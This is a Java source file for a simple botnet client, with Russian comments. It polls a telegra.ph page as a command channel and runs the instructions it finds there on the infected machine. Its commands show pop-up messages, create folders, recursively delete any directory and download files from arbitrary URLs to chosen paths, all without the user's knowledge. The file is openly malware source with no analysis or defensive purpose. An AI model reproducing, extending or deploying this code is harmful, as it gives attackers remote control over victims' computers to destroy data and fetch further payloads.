import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Scanner;
import java.util.regex.*;
import javax.swing.*;

import org.omg.CORBA.portable.InputStream;

import javax.*;
import java.nio.*;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.ReadableByteChannel;

public class bot{


	static getUpdates upDates ;
	static botNet myBotNet ;
	public static void main(String[] args) {
		upDates = new getUpdates();
		myBotNet = new botNet();

		upDates.start();
		myBotNet.start();

	}
	
}

class botNet extends Thread
{
	public static void recursiveDelete(File file) {

        if (!file.exists())
            return;
        if (file.isDirectory()) {
            for (File f : file.listFiles()) {
                
                recursiveDelete(f);
            }
        }
        file.delete();
        System.out.println("Удаленный файл или папка: " + file.getAbsolutePath());
    }
	
	
	private String Last="";
	String lines="";
	String sendMSGText = "";
	@Override
	public void run()
	{
		while(true)
		{
			try {
				URLConnection  connection = new URL("https://telegra.ph/bot-05-01-3").openConnection();
				Scanner scanner = new Scanner(connection.getInputStream());
				while(scanner.hasNextLine())
				{
//					System.out.println(scanner.nextLine());
					Pattern p = Pattern.compile("<p>(.+?)<\\/p>");
					Matcher m = p.matcher(scanner.nextLine());
//					System.out.println(" " + m.find());
					
					
						if(m.find())
						{
							if(Last.equals(m.group(1)))
							{
								//System.out.println("The same!");
							}
							else
							{
								//mkdir C:&#092;&#092;Users&#092;&#092;Asus&#092;&#092;Desktop&#092;&#092;life
								//mkdir C:&#092;Users&#092;Asus&#092;Desktop&#092;life
								
								String function = m.group(1); // функция с аргументами
								//System.out.println(m.group(1));
								Last = function;
								
								String [] funcEx = function.split(" ");
		
								// Commands
								
								if(funcEx[0].equals("showMSG"))
								{
									for(int i=1; i<funcEx.length; i++)
									{
										sendMSGText +=" " + funcEx[i];
									}
									sendMSGText = sendMSGText.replace("&#33;", "!");
									JOptionPane.showMessageDialog(null, sendMSGText, "CMD", JOptionPane.OK_CANCEL_OPTION);
									sendMSGText = "";
								}
								
								if(funcEx[0].equals("mkdir"))
								{
									String dir = funcEx[1];
									dir = dir.replace("&#092;", "\\");
									File newDir = new File(dir);
									if(!newDir.exists())
									{
										newDir.mkdir();
									}
									else
									{
										System.out.println("The directory already exists!");
									}
								}
								
								if(funcEx[0].equals("mkdirDes"))
								{
									String username = System.getProperty("user.name");
									String dir = "C:\\Users\\" + username + "\\Desktop\\" + funcEx[1];
									System.out.println(dir);
									dir = dir.replace("&#092;", "\\");
									File newDir = new File(dir);
									if(!newDir.exists())
									{
										newDir.mkdir();
									}
									else
									{
										System.out.println("The directory already exists!");
									}
								}
								
								if(funcEx[0].equals("deldir"))
								{
									String dir = funcEx[1];
									dir = dir.replace("&#092;", "\\");
									File newDir = new File(dir);
									if(newDir.exists())
									{
										recursiveDelete(newDir);
									}
									else
									{
										System.out.println("The directory does not exist!");
									}
								}
								
								if(funcEx[0].equals("download"))
								{
									URL web = new URL(funcEx[1]);
									
									ReadableByteChannel readableByteChannel = Channels.newChannel(web.openStream());
									FileOutputStream fileOutputStream = new FileOutputStream(funcEx[2]);
									FileChannel fileChannel = fileOutputStream.getChannel();
									fileOutputStream.getChannel().transferFrom(readableByteChannel, 0, 5000);
								}
								
							}
						}
					}
				scanner.close();
			}
			catch (Exception e) {
				
				e.printStackTrace();
			} 
			
		}
	}
}


class getUpdates extends Thread
{
	@Override
	public void run()	
	{
		while(true) {
			try{
				System.out.println("Sleeping for 5 second...");
				sleep(5000);
			}
			catch(InterruptedException e)
			{
				
			}
		}
	}
}